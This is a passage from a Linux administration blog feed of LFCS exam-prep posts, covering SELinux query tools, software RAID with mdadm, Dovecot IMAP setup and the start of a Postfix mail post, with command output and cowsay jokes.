</span><span class='line'>cobbler_use_nfs                (off  ,  off)  Allow cobbler to use nfs
</span><span class='line'>httpd_use_nfs                  (off  ,  off)  Allow httpd to use nfs
</span><span class='line'>sge_use_nfs                    (off  ,  off)  Allow sge to use nfs
</span><span class='line'>sanlock_use_nfs                (off  ,  off)  Allow sanlock to use nfs
</span><span class='line'>samba_share_nfs                (off  ,  off)  Allow samba to share nfs
</span><span class='line'>ftpd_use_nfs                   (off  ,  off)  Allow ftpd to use nfs
</span><span class='line'>openshift_use_nfs              (off  ,  off)  Allow openshift to use nfs
</span><span class='line'>polipo_use_nfs                 (off  ,  off)  Allow polipo to use nfs
</span><span class='line'>tmpreaper_use_nfs              (off  ,  off)  Allow tmpreaper to use nfs
</span><span class='line'>nfs_export_all_rw              (on   ,   on)  Allow nfs to export all rw
</span><span class='line'>nfs_export_all_ro              (on   ,   on)  Allow nfs to export all ro</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list ports</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>semanage port -l | grep ftp
</span><span class='line'>ftp_data_port_t                tcp      20
</span><span class='line'>ftp_port_t                     tcp      21, 989, 990
</span><span class='line'>ftp_port_t                     udp      989, 990
</span><span class='line'>tftp_port_t                    udp      69</span></code></pre></td></tr></table></div></figure>


<ul>
<li>change label</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>semanage fcontext --add -t &lt;type&gt; file</span></code></pre></td></tr></table></div></figure>


<p>You need to call restorecon after changing the context</p>

<h3>getsebool</h3>

<blockquote><p>get SELinux boolean value(s)</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>getsebool -a | grep ftp
</span><span class='line'>ftpd_anon_write --&gt; off
</span><span class='line'>ftpd_connect_all_unreserved --&gt; off
</span><span class='line'>ftpd_connect_db --&gt; off
</span><span class='line'>ftpd_full_access --&gt; off
</span><span class='line'>ftpd_use_cifs --&gt; off
</span><span class='line'>ftpd_use_fusefs --&gt; off
</span><span class='line'>ftpd_use_nfs --&gt; off
</span><span class='line'>ftpd_use_passive_mode --&gt; off
</span><span class='line'>httpd_can_connect_ftp --&gt; off
</span><span class='line'>httpd_enable_ftp_server --&gt; off
</span><span class='line'>tftp_anon_write --&gt; off
</span><span class='line'>tftp_home_dir --&gt; off</span></code></pre></td></tr></table></div></figure>


<h3>setsebool</h3>

<blockquote><p>set SELinux boolean value</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>setseebol &lt;boolean&gt; on/off</span></code></pre></td></tr></table></div></figure>


<ul>
<li>-P # make the change persistent to reboots</li>
</ul>


<h3>seinfo</h3>

<blockquote><p>SELinux policy query tool</p></blockquote>

<p>Install the <em>setools</em> package to get this utility</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>seinfo
</span><span class='line'>
</span><span class='line'>Statistics for policy file: /sys/fs/selinux/policy
</span><span class='line'>Policy Version & Type: v.28 (binary, mls)
</span><span class='line'>
</span><span class='line'>   Classes:            91    Permissions:       256
</span><span class='line'>   Sensitivities:       1    Categories:       1024
</span><span class='line'>   Types:            4729    Attributes:        251
</span><span class='line'>   Users:               8    Roles:              14
</span><span class='line'>   Booleans:          301    Cond. Expr.:       350
</span><span class='line'>   Allow:          101266    Neverallow:          0
</span><span class='line'>   Auditallow:        157    Dontaudit:        8030
</span><span class='line'>   Type_trans:      17756    Type_change:        74
</span><span class='line'>   Type_member:        35    Role allow:         39
</span><span class='line'>   Role_trans:        416    Range_trans:      5697
</span><span class='line'>   Constraints:       109    Validatetrans:       0
</span><span class='line'>   Initial SIDs:       27    Fs_use:             28
</span><span class='line'>   Genfscon:          105    Portcon:           597
</span><span class='line'>   Netifcon:            0    Nodecon:             0
</span><span class='line'>   Permissives:         6    Polcap:              2</span></code></pre></td></tr></table></div></figure>


<h3>sealert</h3>

<blockquote><p>sealert is the user interface component (either GUI or command line) to
the  setroubleshoot  system. setroubleshoot is used to diagnose SELinux
denials and attempts  to  provide  user  friendly  explanations  for  a
SELinux  denial (e.g. AVC) and recommendations for how one might adjust
the system to prevent the denial in the future.</p></blockquote>

<ul>
<li><p>-l # Lookup alert by id, if id is wildcard * then return all alerts</p></li>
<li><p>-a # Scan a log file, analyze its AVC&rsquo;s</p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sealert -a /var/log/audit/audit.log
</span><span class='line'>100% done
</span><span class='line'>found 4 alerts in /var/log/audit/audit.log
</span><span class='line'>--------------------------------------------------------------------------------
</span><span class='line'>
</span><span class='line'>SELinux is preventing /usr/bin/pgrep from getattr access on the filesystem /sys.
</span><span class='line'>
</span><span class='line'>*****  Plugin catchall (100. confidence) suggests   **************************
</span><span class='line'>
</span><span class='line'>If you believe that pgrep should be allowed getattr access on the sys filesystem by default.
</span><span class='line'>Then you should report this as a bug.
</span><span class='line'>You can generate a local policy module to allow this access.
</span><span class='line'>Do
</span><span class='line'>allow this access for now by executing:
</span><span class='line'># ausearch -c 'pgrep' --raw | audit2allow -M my-pgrep
</span><span class='line'># semodule -i my-pgrep.pp
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Additional Information:
</span><span class='line'>Source Context                system_u:system_r:ksmtuned_t:s0
</span><span class='line'>Target Context                system_u:object_r:sysfs_t:s0
</span><span class='line'>Target Objects                /sys [ filesystem ]
</span><span class='line'>Source                        pgrep
</span><span class='line'>Source Path                   /usr/bin/pgrep
</span><span class='line'>Port                          &lt;Unknown&gt;
</span><span class='line'>Host                          &lt;Unknown&gt;
</span><span class='line'>Source RPM Packages           procps-ng-3.3.10-10.el7.x86_64
</span><span class='line'>Target RPM Packages           filesystem-3.2-21.el7.x86_64
</span><span class='line'>Policy RPM                    selinux-policy-3.13.1-102.el7_3.16.noarch
</span><span class='line'>Selinux Enabled               True
</span><span class='line'>Policy Type                   targeted
</span><span class='line'>Enforcing Mode                Enforcing
</span><span class='line'>Host Name                     rhel7
</span><span class='line'>Platform                      Linux rhel7 3.10.0-514.26.2.el7.x86_64 #1 SMP Fri
</span><span class='line'>                              Jun 30 05:26:04 UTC 2017 x86_64 x86_64
</span><span class='line'>Alert Count                   9
</span><span class='line'>First Seen                    2018-02-10 02:25:54 JST
</span><span class='line'>Last Seen                     2018-02-10 03:19:45 JST
</span><span class='line'>Local ID                      d5a68144-c84d-44c4-bde0-31380fd5bb60
</span><span class='line'>
</span><span class='line'>Raw Audit Messages
</span><span class='line'>type=AVC msg=audit(1518200385.729:205): avc:  denied  { getattr } for  pid=4616 comm="pgrep" name="/" dev="sysfs" ino=1 scontext=system_u:system_r:ksmtuned_t:s0 tcontext=system_u:object_r:sysfs_t:s0 tclass=filesystem
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>type=SYSCALL msg=audit(1518200385.729:205): arch=x86_64 syscall=statfs success=no exit=EACCES a0=7f9407f4e013 a1=7fffcd705e80 a2=fffffffffff476d8 a3=7fffcd705b90 items=0 ppid=4615 pid=4616 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm=pgrep exe=/usr/bin/pgrep subj=system_u:system_r:ksmtuned_t:s0 key=(null)
</span><span class='line'>
</span><span class='line'>Hash: pgrep,ksmtuned_t,sysfs_t,filesystem,getattr
</span><span class='line'>[...]</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> __________________________________
</span><span class='line'>/ Someone is speaking well of you. \
</span><span class='line'>|                                  |
</span><span class='line'>\ How unusual!                     /
</span><span class='line'> ----------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Software RAID]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/22/lfcs-prep-software-raid/"/>
    <updated>2018-02-22T13:37:45-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/22/lfcs-prep-software-raid</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll look at creating software RAID devices with <em>mdadm</em>. For the example I will use /dev/sdb1 and /dev/sdb2</p>

<!-- more -->


<p>To create an array:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mdadm --create --verbose /dev/md0 --level=mirror --raid-devices=2 /dev/sdb1 /dev/sdb2
</span><span class='line'>mdadm: /dev/sdb1 appears to be part of a raid array:
</span><span class='line'>       level=raid0 devices=0 ctime=Thu Jan  1 09:00:00 1970
</span><span class='line'>mdadm: partition table exists on /dev/sdb1 but will be lost or
</span><span class='line'>       meaningless after creating array
</span><span class='line'>mdadm: Note: this array has metadata at the start and
</span><span class='line'>    may not be suitable as a boot device.  If you plan to
</span><span class='line'>    store '/boot' on this device please ensure that
</span><span class='line'>    your boot-loader understands md/v1.x metadata, or use
</span><span class='line'>    --metadata=0.90
</span><span class='line'>mdadm: size set to 102272K
</span><span class='line'>Continue creating array? y
</span><span class='line'>mdadm: Defaulting to version 1.2 metadata
</span><span class='line'>mdadm: array /dev/md0 started.
</span></code></pre></td></tr></table></div></figure>


<p>To view more information about the array:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /proc/mdstat
</span><span class='line'>Personalities : [raid1] 
</span><span class='line'>md0 : active raid1 sdb2[1] sdb1[0]
</span><span class='line'>      102272 blocks super 1.2 [2/2] [UU]
</span><span class='line'>      
</span><span class='line'>unused devices: &lt;none&gt;</span></code></pre></td></tr></table></div></figure>


<p>For more detailed information:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mdadm --detail /dev/md0
</span><span class='line'>/dev/md0:
</span><span class='line'>        Version : 1.2
</span><span class='line'>  Creation Time : Tue Feb 20 00:17:49 2018
</span><span class='line'>     Raid Level : raid1
</span><span class='line'>     Array Size : 102272 (99.88 MiB 104.73 MB)
</span><span class='line'>  Used Dev Size : 102272 (99.88 MiB 104.73 MB)
</span><span class='line'>   Raid Devices : 2
</span><span class='line'>  Total Devices : 2
</span><span class='line'>    Persistence : Superblock is persistent
</span><span class='line'>
</span><span class='line'>    Update Time : Tue Feb 20 00:17:53 2018
</span><span class='line'>          State : clean 
</span><span class='line'> Active Devices : 2
</span><span class='line'>Working Devices : 2
</span><span class='line'> Failed Devices : 0
</span><span class='line'>  Spare Devices : 0
</span><span class='line'>
</span><span class='line'>           Name : rhel7:0  (local to host rhel7)
</span><span class='line'>           UUID : a92e04f3:1652f291:8c68266d:6c760648
</span><span class='line'>         Events : 17
</span><span class='line'>
</span><span class='line'>    Number   Major   Minor   RaidDevice State
</span><span class='line'>       0       8       17        0      active sync   /dev/sdb1
</span><span class='line'>       1       8       18        1      active sync   /dev/sdb2</span></code></pre></td></tr></table></div></figure>


<p>Now format the RAID device:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkfs.ext4 /dev/md0</span></code></pre></td></tr></table></div></figure>


<p>You need to create the config file <code>/etc/mdadm.conf</code> and add to it the output of the below command:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mdadm --detail --scan
</span><span class='line'>ARRAY /dev/md0 metadata=1.2 name=rhel7:0 UUID=a92e04f3:1652f291:8c68266d:6c760648</span></code></pre></td></tr></table></div></figure>


<p>See more information about the array disks:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mdadm --examine /dev/sdb1
</span><span class='line'>/dev/sdb1:
</span><span class='line'>          Magic : a92b4efc
</span><span class='line'>        Version : 1.2
</span><span class='line'>    Feature Map : 0x0
</span><span class='line'>     Array UUID : a92e04f3:1652f291:8c68266d:6c760648
</span><span class='line'>           Name : rhel7:0  (local to host rhel7)
</span><span class='line'>  Creation Time : Tue Feb 20 00:17:49 2018
</span><span class='line'>     Raid Level : raid1
</span><span class='line'>   Raid Devices : 2
</span><span class='line'>
</span><span class='line'> Avail Dev Size : 204640 (99.92 MiB 104.78 MB)
</span><span class='line'>     Array Size : 102272 (99.88 MiB 104.73 MB)
</span><span class='line'>  Used Dev Size : 204544 (99.88 MiB 104.73 MB)
</span><span class='line'>    Data Offset : 160 sectors
</span><span class='line'>   Super Offset : 8 sectors
</span><span class='line'>   Unused Space : before=72 sectors, after=96 sectors
</span><span class='line'>          State : clean
</span><span class='line'>    Device UUID : 109087ab:0f2121e6:b6e09819:ffba2648
</span><span class='line'>
</span><span class='line'>    Update Time : Tue Feb 20 00:22:17 2018
</span><span class='line'>  Bad Block Log : 512 entries available at offset 72 sectors
</span><span class='line'>       Checksum : f832b421 - correct
</span><span class='line'>         Events : 17
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>   Device Role : Active device 0
</span><span class='line'>   Array State : AA ('A' == active, '.' == missing, 'R' == replacing)</span></code></pre></td></tr></table></div></figure>


<p>Mount the array and check it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>df -h /dev/md0
</span><span class='line'>Filesystem      Size  Used Avail Use% Mounted on
</span><span class='line'>/dev/md0         93M  1.6M   85M   2% /mnt/raid</span></code></pre></td></tr></table></div></figure>


<p>Other useful commands:</p>

<ul>
<li>assemble array</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mdadm --assemble /dev/md0</span></code></pre></td></tr></table></div></figure>


<ul>
<li>remove disk from array (you have to mark it as failing first)</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mdadm --fail /dev/md0 /dev/sdb2
</span><span class='line'>mdadm --remove /dev/md0 /dev/sdb2</span></code></pre></td></tr></table></div></figure>


<ul>
<li>add disk to array</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mdadm --add /dev/md0 /dev/sdb2</span></code></pre></td></tr></table></div></figure>


<ul>
<li>remove array</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mdadm --stop /dev/md0
</span><span class='line'>mdadm --remove /dev/md0</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _____________________________________
</span><span class='line'>/ Don't relax! It's only your tension \
</span><span class='line'>\ that's holding you together.        /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Configure an IMAP service]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/19/lfcs-prep-configure-an-imap-service/"/>
    <updated>2018-02-19T12:49:18-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/19/lfcs-prep-configure-an-imap-service</id>
    <content type="html"><![CDATA[<p>Today we continue with the IMAP/S of LFCS, by configuring Dovecot.</p>

<p><a href="https://www.dovecot.org/">Dovecot</a> is an open source IMAP / POP3 server written with security in mind. It can be installed on CentOS via the <em>dovecot</em> package.</p>

<!-- more -->


<p>Inside the <code>/etc/dovecot.conf</code> file you have to add / edit some settings:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>protocols = imap pop3</span></code></pre></td></tr></table></div></figure>


<p>The above also include the secure versions of IMAPS and POP3 secure.</p>

<p>Next you have to edit the mailbox and namespace file <code>/etc/dovecot/conf.d/10-mail.conf</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mail_location = mbox:~/mail:INBOX=/var/mail/%u
</span><span class='line'>mail_privileged_group = mail</span></code></pre></td></tr></table></div></figure>


<p>These will set the mailbox location to <em>/var/mail/username</em> and will set the group to <em>mail</em> for privileged operations.</p>

<p>Inside <code>/etc/dovecot/conf.d/10-ssl.conf</code> ensure that the below lines are uncommented:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssl_cert = &lt;/etc/pki/dovecot/certs/dovecot.pem
</span><span class='line'>ssl_key = &lt;/etc/pki/dovecot/private/dovecot.pem</span></code></pre></td></tr></table></div></figure>


<p>Dump the non-default settings if you want an overview of Dovecot&rsquo;s settings:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dovecot -n
</span><span class='line'># 2.2.10: /etc/dovecot/dovecot.conf
</span><span class='line'># OS: Linux 3.10.0-514.21.1.el7.x86_64 x86_64 CentOS Linux release 7.3.1611 (Core)  
</span><span class='line'>first_valid_uid = 1000
</span><span class='line'>mail_location = mbox:~/mail:INBOX=/var/mail/%u
</span><span class='line'>mail_privileged_group = mail
</span><span class='line'>mbox_write_locks = fcntl
</span><span class='line'>namespace inbox {
</span><span class='line'>  inbox = yes
</span><span class='line'>  location = 
</span><span class='line'>  mailbox Drafts {
</span><span class='line'>    special_use = \Drafts
</span><span class='line'>  }
</span><span class='line'>  mailbox Junk {
</span><span class='line'>    special_use = \Junk
</span><span class='line'>  }
</span><span class='line'>  mailbox Sent {
</span><span class='line'>    special_use = \Sent
</span><span class='line'>  }
</span><span class='line'>  mailbox "Sent Messages" {
</span><span class='line'>    special_use = \Sent
</span><span class='line'>  }
</span><span class='line'>  mailbox Trash {
</span><span class='line'>    special_use = \Trash
</span><span class='line'>  }
</span><span class='line'>  prefix = 
</span><span class='line'>}
</span><span class='line'>passdb {
</span><span class='line'>  driver = pam
</span><span class='line'>}
</span><span class='line'>protocols = imap pop3
</span><span class='line'>ssl = required
</span><span class='line'>ssl_cert = &lt;/etc/pki/dovecot/certs/dovecot.pem
</span><span class='line'>ssl_key = &lt;/etc/pki/dovecot/private/dovecot.pem
</span><span class='line'>userdb {
</span><span class='line'>  driver = passwd
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Start dovecot and check that it&rsquo;s listening on its ports:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>netstat -ltpn | grep dovecot
</span><span class='line'>tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN      4629/dovecot        
</span><span class='line'>tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN      4629/dovecot        
</span><span class='line'>tcp        0      0 0.0.0.0:993             0.0.0.0:*               LISTEN      4629/dovecot        
</span><span class='line'>tcp        0      0 0.0.0.0:995             0.0.0.0:*               LISTEN      4629/dovecot        </span></code></pre></td></tr></table></div></figure>


<p>Send a mail to a user:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo "Readme" | mail -s "README" nixhat@example.com</span></code></pre></td></tr></table></div></figure>


<p>The mail will be readable in <em>/var/mail/nixhat</em>. I installed the mutt client to view it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>i:Exit  -:PrevPg  &lt;Space&gt;:NextPg v:View Attachm.  d:Del  r:Reply  j:Next ?:Help
</span><span class='line'>Date: Mon, 19 Feb 2018 19:35:30 +0200
</span><span class='line'>From: root &lt;root@example.com&gt;
</span><span class='line'>To: nixhat@example.com
</span><span class='line'>Subject: README
</span><span class='line'>User-Agent: Heirloom mailx 12.5 7/5/10
</span><span class='line'>
</span><span class='line'>Readme</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Avert misunderstanding by calm, poise, \
</span><span class='line'>\ and balance.                           /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Configure an SMTP mail service]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/17/lfcs-prep-configure-an-smtp-mail-service/"/>
    <updated>2018-02-17T12:16:33-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/17/lfcs-prep-configure-an-smtp-mail-service</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll look at configuring a mail service for LFCS objectives. We&rsquo;ll use the Postfix implementation that already comes preinstalled  on CentOS.</p>

<!-- more -->


<p>The configuration file with all Postfix parameters is <code>/etc/postfix/main.cf</code> and it is massive. Instead of manually editing it, it&rsquo;s easier to use <strong>postconf</strong>. Without arguments, it displays all parameters. If given a parameter name, it will show that parameter&rsquo;s value, and with the <strong>-e</strong> flag it can modify parameters.</p>

<p>Another important file for mail configuration is <code>/etc/aliases</code>. If you want a mail destined to a user to be delivered to another user, you can set an alias:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>username: alias </span></code></pre></td></tr></table></div></figure>


